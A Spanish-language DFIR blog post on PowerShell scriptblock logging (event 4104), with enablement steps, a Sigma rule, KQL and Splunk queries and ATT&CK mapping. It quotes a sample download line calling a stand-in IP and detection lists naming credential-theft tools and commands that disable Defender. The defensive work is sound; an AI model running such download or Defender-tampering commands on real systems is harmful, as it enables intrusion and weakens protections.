---
title: "PowerShell Event ID 4104 explicado: scriptblock logging para DFIR"
description: "Scriptblock logging es el control defensivo gratuito más útil de Windows. Registra el cuerpo completo del script, incluidos los ofuscados o en memoria, bajo el evento 4104."
date: "2026-05-17"
---

Cuando el scriptblock logging de PowerShell está habilitado, el engine registra el cuerpo de cada script que se ejecuta. Comandos interactivos, scripts cargados desde disco, cualquier cosa reflejada en memoria por `Invoke-Expression` o `IEX`. El registro aterriza en `Microsoft-Windows-PowerShell%4Operational.evtx` como event ID **4104**, "Creating Scriptblock text".

Si no tienes un EDR, esto es lo más cercano a uno que la plataforma te da. Actívalo. El coste es insignificante y la ventaja es todo lo que PowerShell intenta esconder.

## Lo que obtienes

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

Para un script largo, PowerShell divide el cuerpo entre múltiples registros 4104, uno por `MessageNumber`. Juntarlos de nuevo es esencial. Los fragmentos son fáciles de malinterpretar, y un atacante que sepa del scriptblock logging deliberadamente rellenará líneas para que una coincidencia parcial a través de un solo registro parezca benigna.

## Cómo activarlo

`HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`. O la Group Policy en *Computer Configuration / Administrative Templates / Windows Components / Windows PowerShell / Turn on PowerShell Script Block Logging*. No hay coste medible del lado de PowerShell. Actívalo en todas partes.

Mientras estás ahí, habilita Module Logging y transcripción también. Module Logging (4103) te da los valores de parámetros por invocación. La transcripción escribe la sesión de consola renderizada a un archivo que puedes enviar. Cada uno atrapa una porción diferente. Ninguno sustituye 4104.

## Lo que 4104 atrapa que nada más lo hace

El engine de PowerShell loguea el script *después* de cualquier encoding, compresión o reflexión en memoria. Eso significa:

- Una invocación `-EncodedCommand` loguea tanto el launcher codificado (en el [4688](/en/blog/event-id-4688-process-creation) correspondiente o [Sysmon 1](/en/blog/sysmon-event-id-1-process-create)) como el cuerpo decodificado (en 4104).
- Un script que descarga y aplica `Invoke-Expression` a un payload remoto loguea el cuerpo *ejecutado*, no el wrapper.
- Un atacante que usa bypasses AMSI todavía deja el registro 4104. El bypass afecta el escaneo, no el logging. El propio bypass a menudo se muestra como líneas 4104 conteniendo `amsiInitFailed` o `amsiScanBuffer`.

Este es el control defensivo gratuito más útil de la plataforma. Los defensores que no tienen EDR usualmente sí tienen esto.

## Triando 4104 a escala

Los patrones de alta señal en un corpus de registros 4104:

- `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient`. Fetch de contenido remoto.
- `IEX`, `Invoke-Expression`. Ejecución dinámica.
- `FromBase64String`, `[System.Convert]::FromBase64String`. Payload codificado.
- `Add-MpPreference -ExclusionPath`. Manipulación de Defender.
- `Set-MpPreference -DisableRealtimeMonitoring`. Manipulación de Defender.
- `[System.Reflection.Assembly]::Load`, `[Reflection.Emit]`. Carga de assembly en memoria.
- `Invoke-Mimikatz`, `Invoke-Kerberoast`, `Invoke-BloodHound`, `DCSync`. Tooling ofensivo conocido.

Una sola coincidencia por sí sola no siempre es maliciosa (los admins también usan `DownloadString`). Las combinaciones sí. Pivota de 4104 al [Sysmon evento 1](/en/blog/sysmon-event-id-1-process-create) o [4688](/en/blog/event-id-4688-process-creation) correspondientes por timestamp + proceso para recuperar el contexto de invocación completo.

## Sigma: tooling ofensivo de PowerShell

```yaml
title: Suspicious PowerShell Scriptblock - Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## KQL: PowerShell codificado desde un usuario de bajos privilegios

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Splunk: manipulación de Defender desde PowerShell

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## Mapeo ATT&CK

- T1059.001 Command and Scripting Interpreter: PowerShell. Cada 4104 ofensivo se mapea aquí. PowerShell es una de las técnicas de ejecución más citadas en intrusiones modernas.
- T1027 Obfuscated Files or Information. Patrones Encoded, Base64, `FromBase64String`.
- T1140 Deobfuscate/Decode Files or Information. El engine loguea la forma *decodificada*, que es el valor que 4104 proporciona sobre [4688](/en/blog/event-id-4688-process-creation).
- T1562.001 Impair Defenses: Disable or Modify Tools. `Set-MpPreference -DisableRealtimeMonitoring`, `Add-MpPreference -ExclusionPath`.
- T1003.001 LSASS Memory. Patrones `Invoke-Mimikatz`, `MiniDump`, `comsvcs.dll` en cuerpos de script.
- T1558.003 Kerberoasting. Patrones `Invoke-Kerberoast`, Rubeus kerberoast.

## Falsos positivos que se ven exactamente como ataques

- Los runbooks de admin a veces usan `Invoke-Expression` legítimamente para configuración con templates. La combinación usualmente es corta, repetible y desde sesiones de admin conocidas.
- Los scripts de gestión de Defender (IT corporativo) llaman a `Set-MpPreference` legítimamente para empujar listas de exclusión. Pon en lista blanca por el certificado de firma del script o SID del host.
- Chocolatey, WinGet, instaladores de paquete usan PowerShell codificado en Base64 legítimamente. Patrón: corto, durante el día, desde hosts de build o admin.
- La actividad de red-team o pentest se verá idéntica a ataques reales. Coordina ventanas de engagement y etiqueta IPs origen del operador.

## El punto ciego

4104 loguea el *cuerpo* del script. No loguea ejecución por sentencia, retornos de función o valores de variable. Para eso necesitas 4103 (Module logging) o un EDR real. 4104 te dice qué corrió. El resto te dice qué hizo.

Si 4104 estaba apagado cuando ocurrió el ataque (el caso más común que veo en incidentes en parques desactualizados), el cuerpo del script se fue. La invocación wrapper podría seguir en [4688](/en/blog/event-id-4688-process-creation), el sello binario en [AmCache](https://www.amcacheparser.com) y el directorio de trabajo en [prefetch](https://www.prefetchparser.com), pero el código real está perdido a menos que puedas tallarlo de [pagefile.sys](https://www.pagefilesysparser.com) o un [volcado de RAM](https://www.ramparser.com). Actívalo ahora para que no tengas esa discusión contigo mismo la próxima vez.

## Lecturas adicionales

- [Documentación Microsoft: PowerShell script block logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- [FireEye/Mandiant: Greater Visibility Through PowerShell Logging](https://www.mandiant.com/resources/blog/greater-visibility)
- [Daniel Bohannon: Invoke-Obfuscation y detección](https://github.com/danielbohannon/Invoke-Obfuscation)
